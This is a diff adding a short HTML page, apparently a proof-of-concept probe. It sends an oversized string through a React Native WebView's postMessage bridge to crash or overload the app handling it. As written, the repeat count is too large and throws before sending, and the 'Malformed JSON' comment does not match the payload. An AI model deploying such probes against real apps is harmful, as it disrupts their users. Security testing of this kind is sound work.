@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<body>
+<pre id="log"></pre>
+<script>
+const log = msg => document.getElementById("log").textContent += "\n" + msg;
+
+try {
+    if (window.ReactNativeWebView) {
+        log("ReactNativeWebView handler detected (Android).");
+
+        // Malformed JSON
+        const payload = "A".repeat(10_000_000_000_000_000_000);
+
+        window.ReactNativeWebView.postMessage(payload);
+        log("Payload sent: " + payload);
+    } else {
+        log("ReactNativeWebView handler not available.");
+    }
+} catch (e) {
+    log("JS Exception: " + e.message);
+}
+</script>
+</body>
+</html>
